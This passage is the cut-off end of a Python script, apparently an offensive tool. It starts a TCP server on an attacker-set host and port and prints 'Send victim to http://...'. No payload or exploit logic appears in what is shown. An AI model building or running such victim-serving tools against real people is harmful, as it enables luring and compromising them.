            with socketserver.TCPServer((self.lhost, self.lport), handler) as httpd:
                print(f"[+] Server started. Send victim to http://{self.lhost}:{self.lport}/")
                print("[*] Press Ctrl+C to stop.")
                httpd.serve_forever()
        except Exception as e:
            print(f"[-] Server error: {e}")

if __name__ == "__main__":
    Start()

